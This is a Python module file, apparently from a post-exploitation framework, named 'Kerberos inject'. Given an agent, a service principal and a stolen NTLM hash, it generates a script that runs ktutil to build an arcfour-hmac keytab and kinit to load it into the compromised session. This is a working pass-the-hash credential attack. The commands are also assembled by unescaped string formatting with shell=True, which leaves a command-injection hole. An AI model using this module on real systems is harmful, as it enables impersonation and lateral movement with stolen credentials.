from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Kerberos inject',

            # list of one or more authors for the module
            'Author': ['@424f424f'],

            # more verbose multi-line description of the module
            'Description': ('Generates a kerberos keytab and injects it into the current runspace.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['Thanks to @passingthehash for bringing this up.']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Keytab' : {
                'Description'   :   'Keytab file to create.',
                'Required'      :   True,
                'Value'         :   'user.keytab'
            },
            'Principal' : {
                'Description'   :   'The service principal name. user@HACKME.COM',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Hash' : {
                'Description'   :   'NTLM Hash for the principal.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        keytab = self.options['Keytab']['Value']
        principal = self.options['Principal']['Value']
        ntlmhash = self.options['Hash']['Value']

        

        script = """
import subprocess
try:
    print "Creating Keytab.."
    cmd = 'ktutil -k %s add -p %s -e arcfour-hmac-md5 -w %s --hex -V 5'
    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    print ""
    print "Keytab created!"
except Exception as e:
    print e

try:
    print "Injecting kerberos key.."
    cmd = 'kinit -t %s %s'
    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    print ""
    print "Keytab injected into current session!"
except Exception as e:
    print e
""" %(keytab,principal,ntlmhash,keytab,principal)

        return script